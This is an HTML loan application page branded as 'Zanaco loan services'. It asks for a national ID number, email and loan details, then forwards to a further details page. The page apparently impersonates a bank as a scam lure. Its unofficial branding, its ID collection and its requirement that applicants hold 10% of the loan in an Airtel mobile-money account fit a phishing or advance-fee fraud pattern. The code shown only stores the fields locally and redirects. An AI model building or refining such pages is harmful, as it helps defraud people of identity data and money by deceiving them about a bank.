<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loan Application</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f6f8;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .card {
      background: #fff;
      padding: 25px;
      width: 100%;
      max-width: 420px;
      border-radius: 10px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    label {
      font-weight: bold;
      margin-top: 12px;
      display: block;
    }
    input, select, button {
      width: 100%;
      padding: 10px;
      margin-top: 6px;
      border-radius: 6px;
      border: 1px solid #ccc;
    }
    button {
      background: #0066ff;
      color: white;
      font-size: 16px;
      border: none;
      margin-top: 20px;
      cursor: pointer;
    }
    button:hover {
      background: #004ecc;
    }
     .logo {
    width: 120px; /* adjust as needed */
    margin-bottom: 20px;
     }
     .logo-container {
    width: 100%;
    height: 120px; /* change to your desired height */
    overflow: hidden;
    margin-bottom: 20px;
}

.logo-container .logo {
    width: 100%;
    height: 100%;
    object-fit: cover; /* fills container without distortion */
    display: block;
}
.zanaco-header {
    text-align: center;
}
.loan-notice {
    background: #fff3cd;
    color: #856404;
    border: 1px solid #ffeeba;
    padding: 12px 15px;
    border-radius: 6px;
    margin-bottom: 20px;
    font-size: 14px;
    margin-top: 10px;
}

.loan-notice h4 {
    margin: 0 0 8px 0;
    font-size: 15px;
}

  </style>
</head>
<body>

<div class="card">

    <h1 class="zanaco-header"> Zanaco loan services</h1>
    <div class="logo-container">
          <img src="zanaco-dp.jpeg" class="logo">
    </div>
 
  <h2>Loan Application</h2>

  <label>Loan Amount (ZMW)</label>
  <input type="number" id="amount" placeholder="500-20000" required>

  <label>National Id</label>
   <input type="number" id="nationalid" placeholder="National Id" required>
    <label>Email</label>
   <input type="email" id="email" placeholder="example@gmail.com" required>
  <label>Repayment Period</label>
 
  <select id="period" required>
    <option value="">Select period</option>
    <option>7 Days(1.5% intrest)</option>
    <option>14 Days(2% intrest)</option>
    <option>30 Days(2.5% intrest)</option>
    <option>60 Days(3% intrest)</option>
    <option>90 Days(5% intrest)</option>
  </select>

  <label>Employment Status</label>
  <select id="employment" required>
    <option value="">Select status</option>
    <option>Employed</option>
    <option>Self-employed</option>
    <option>Student</option>
    <option>Unemployed</option>
  </select>

  <label>Loan Purpose</label>
  <select id="purpose" required>
    <option value="">Select purpose</option>
    <option>Business</option>
    <option>Personal use</option>
    <option>Emergency</option>
    <option>School fees</option>
    <option>Medical</option>
  </select>
    <div class="loan-notice">
    <h4>Loan Qualifications:</h4>
    <ul>
        <li>Applicant must use an <strong>Airtel</strong> number.</li>
        <li>Maintain at least <strong>10%</strong> of the loan amount applying for in the Airtel account.</li>
    </ul>
</div>

  <button onclick="goNext()">Continue</button>
</div>

<script>
function goNext() {
  const amount = document.getElementById('amount').value;
  const period = document.getElementById('period').value;
  const employment = document.getElementById('employment').value;
  const purpose = document.getElementById('purpose').value;

  if (!amount || !period || !employment || !purpose) {
    alert('Please fill all fields');
    return;
  }

  // Save loan info for next pages
  localStorage.setItem('loanApplication', JSON.stringify({
    amount, period, employment, purpose
  }));

  // Redirect
  window.location.href = 'details.html';
}
</script>

</body>
</html>
